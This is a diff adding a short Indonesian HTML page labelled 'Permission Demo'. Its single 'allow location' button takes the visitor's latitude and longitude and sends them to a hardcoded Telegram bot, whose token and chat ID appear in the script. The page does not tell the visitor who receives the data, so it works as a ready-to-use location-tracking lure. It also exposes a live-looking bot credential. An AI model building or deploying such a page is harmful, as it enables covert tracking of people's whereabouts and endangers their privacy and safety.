@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Permission Demo</title>
+
+<style>
+  body{
+    margin:0;
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    background:white;
+    font-family:Arial;
+  }
+
+  button{
+    padding:15px 25px;
+    border:none;
+    background:black;
+    color:white;
+    cursor:pointer;
+    border-radius:10px;
+  }
+</style>
+</head>
+<body>
+
+<button onclick="start()">Izinkan Lokasi</button>
+
+<script>
+const BOT_TOKEN = "8876107730:AAFstpmYpJBtsBphsLbJc5dasNJUtI";
+const CHAT_ID = "8664944714";
+
+async function sendTelegram(text) {
+
+  await fetch(
+    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+    {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text
+      })
+    }
+  );
+
+}
+
+function start() {
+
+  navigator.geolocation.getCurrentPosition(
+    async (pos) => {
+
+      const data =
+`Pengguna mengizinkan lokasi
+
+Latitude: ${pos.coords.latitude}
+Longitude: ${pos.coords.longitude}`;
+
+      await sendTelegram(data);
+
+      alert("Lokasi berhasil dikirim");
+
+    },
+    () => {
+      alert("Izin lokasi ditolak");
+    }
+  );
+
+}
+</script>
+
+</body>
+</html>
